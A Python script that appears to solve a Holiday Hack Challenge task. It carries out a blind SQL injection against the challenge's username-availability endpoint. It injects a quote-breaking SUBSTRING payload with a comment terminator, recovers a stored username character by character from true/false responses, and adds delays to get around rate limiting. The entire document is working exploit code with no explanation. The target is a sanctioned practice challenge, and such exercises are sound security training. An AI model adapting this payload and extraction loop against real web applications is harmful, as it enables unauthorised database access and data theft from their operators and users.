import requests
import time

# Target URL
BASE_URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"
# Character set to test
charset = "abcdefghijklmnopqrstuvwxyz-_."

# Max length of username to extract
MAX_LENGTH = 30

# Result accumulator
extracted = ""

def check_char(position, char):
    # Construct payload
    payload = f'"or SUBSTRING(c.username,{position},1)=\'{char}\'--'
    params = {
        "username": payload,
    }
    
    # Send request
    response = requests.get(BASE_URL, params=params)
    # Sleep to bypass rate limiting
    time.sleep(0.5)
    # Interpret response
    return '"available":false' in response.text

# Extraction loop
for pos in range(0, MAX_LENGTH + 1):
    found = False
    for ch in charset:
        if check_char(pos, ch):
            extracted += ch
            print(f"[*] Found character at position {pos}: {ch}")
            found = True
            break
    if not found:
        print(f"[-] No match at position {pos}, assuming end of string.")
        break

print(f"\n[+] Extracted username: {extracted}")
